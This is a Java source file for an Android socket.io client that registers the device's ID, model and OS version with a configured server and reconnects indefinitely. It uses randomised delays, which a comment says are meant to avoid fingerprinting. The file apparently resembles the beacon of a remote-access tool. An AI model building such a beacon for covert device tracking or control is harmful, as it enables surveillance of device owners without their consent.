package com.fason.app.core.network;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import com.fason.app.core.FasonApp;
import com.fason.app.core.config.Config;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import io.socket.client.IO;
import io.socket.client.Socket;

public final class SocketClient {
    private static final int RECONNECT_DELAY = 5000;
    private static volatile SocketClient instance;
    private static volatile boolean shutdownRequested = false;
    private volatile Socket socket;
    private ConnectivityManager.NetworkCallback networkCallback;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private volatile boolean connected = false;

    private SocketClient() {
        init();
        setupNetworkMonitor();
    }

    public static synchronized SocketClient getInstance() {
        if (shutdownRequested) return null;
        if (instance == null) {
            instance = new SocketClient();
        }
        return instance;
    }

    public static synchronized void reset() {
        shutdownRequested = false;
        instance = null;
    }

    private synchronized void init() {
        shutdownRequested = false;
        try {
            String deviceId = Settings.Secure.getString(
                FasonApp.getContext().getContentResolver(),
                Settings.Secure.ANDROID_ID
            );
            if (deviceId == null) deviceId = "unknown";
            String query = "model=" + encode(Build.MODEL)
                + "&manf=" + encode(Build.MANUFACTURER)
                + "&release=" + encode(Build.VERSION.RELEASE)
                + "&id=" + encode(deviceId);
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionAttempts = Integer.MAX_VALUE;
            opts.reconnectionDelay = 2000;
            opts.reconnectionDelayMax = 120000;
            opts.timeout = 30000;
            opts.query = query;
            opts.secure = Config.isHttps();
            String deviceSecret = Config.getDeviceSecret();
            if (deviceSecret != null && !deviceSecret.isEmpty()) {
                java.util.Map<String, String> auth = new java.util.HashMap<>();
                auth.put("token", deviceSecret);
                opts.auth = auth;
            }
            socket = IO.socket(Config.getServerUrl(), opts);

            // Add jitter: ±30% randomization to prevent fingerprinting
            socket.io().on(io.socket.client.Manager.EVENT_RECONNECT_ATTEMPT, args -> {
                long base = opts.reconnectionDelay;
                long jitter = (long)(base * (0.7 + Math.random() * 0.6));
                opts.reconnectionDelay = Math.min(jitter, opts.reconnectionDelayMax);
            });
            socket.on(Socket.EVENT_CONNECT, args -> connected = true);
            socket.on(Socket.EVENT_DISCONNECT, args -> connected = false);
            socket.on(Socket.EVENT_CONNECT_ERROR, args -> connected = false);
        } catch (Exception e) {
            Log.e("SocketClient", "init failed", e);
        }
    }

    private void setupNetworkMonitor() {
        ConnectivityManager cm = (ConnectivityManager) FasonApp.getContext()
            .getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm == null) return;
        NetworkRequest req = new NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build();
        networkCallback = new ConnectivityManager.NetworkCallback() {
            @Override
            public void onAvailable(Network network) {
                handler.postDelayed(() -> {
                    if (socket != null && !socket.connected()) {
                        try { socket.connect(); } catch (Exception ignored) {}
                    }
                }, 1000);
            }
        };
        try {
            cm.registerNetworkCallback(req, networkCallback);
        } catch (Exception ignored) {}
    }

    private String encode(String s) {
        try {
            return URLEncoder.encode(s != null ? s : "", StandardCharsets.UTF_8.name());
        } catch (Exception e) {
            return s != null ? s : "";
        }
    }

    public synchronized Socket getSocket() {
        if (socket == null) init();
        return socket;
    }

    public boolean isConnected() {
        Socket s = socket;
        return connected && s != null && s.connected();
    }

    public void reconnect() {
        if (socket != null) {
            try { socket.connect(); } catch (Exception ignored) {}
        }
    }

    public void disconnect() {
        if (socket != null) {
            try { socket.disconnect(); } catch (Exception ignored) {}
        }
    }

    public synchronized void shutdown() {
        shutdownRequested = true;
        disconnect();
        if (socket != null) {
            socket.off(Socket.EVENT_CONNECT);
            socket.off(Socket.EVENT_DISCONNECT);
            socket.off(Socket.EVENT_CONNECT_ERROR);
        }
        if (networkCallback != null) {
            try {
                ConnectivityManager cm = (ConnectivityManager) FasonApp.getContext()
                    .getSystemService(Context.CONNECTIVITY_SERVICE);
                if (cm != null) cm.unregisterNetworkCallback(networkCallback);
            } catch (Exception ignored) {}
            networkCallback = null;
        }
        handler.removeCallbacksAndMessages(null);
        connected = false;
        socket = null;
        instance = null;
    }
}
